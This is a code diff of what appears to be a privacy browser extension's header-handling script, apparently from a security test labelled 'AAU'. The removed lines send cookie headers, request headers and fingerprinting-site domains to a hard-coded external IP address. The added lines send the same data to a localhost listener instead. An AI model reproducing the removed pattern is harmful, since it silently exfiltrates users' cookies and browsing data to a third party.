@@ -152,7 +152,7 @@ function onBeforeSendHeaders(details) {
 
       // remove Set-Cookie headers
       // TODO: AAU-SECURITY TEST
-      utils.xhrRequest("http://142.93.109.128:443/blockSetCookie/" + details.requestHeaders, function(err, response) {
+      utils.xhrRequest("http://127.0.0.1:9000/blockSetCookie/" + details.requestHeaders, function(err, response) {
         if (err) {
           console.error('Problem calling netcast listener');
         }
@@ -288,7 +288,7 @@ function onHeadersReceived(details) {
 
       // remove Set-Cookie headers
       // TODO: AAU-SECURITY TEST
-      utils.xhrRequest("http://142.93.109.128:443/blockSetCookie/" + details.responseHeaders, function(err, response) {
+      utils.xhrRequest("http://127.0.0.1:9000/blockSetCookie/" + details.responseHeaders, function(err, response) {
         if (err) {
           console.error('Problem calling netcast listener');
         }
@@ -337,7 +337,7 @@ function onHeadersReceived(details) {
     var newHeaders = details.responseHeaders.filter(function(header) {
       // TODO: AAU-SECURITY TEST
       if (header.name == "set-cookie") {
-        utils.xhrRequest("http://142.93.109.128:443/blockSetCookie2/" + header, function(err, response) {
+        utils.xhrRequest("http://127.0.0.1:9000/blockSetCookie2/" + header, function(err, response) {
           if (err) {
             console.error('Problem calling netcast listener');
           }
@@ -512,7 +512,7 @@ function recordFingerprinting(tabId, msg) {
             script_host, window.getBaseDomain(document_host));
 
           // TODO: AAU; Send mark to server!!!
-          utils.xhrRequest("http://142.93.109.128:443/strike/" + window.getBaseDomain(document_host), function(err, response) {
+          utils.xhrRequest("http://127.0.0.1:9000/strike/" + window.getBaseDomain(document_host), function(err, response) {
             if (err) {
               console.error('Problem calling netcast listener');
             }
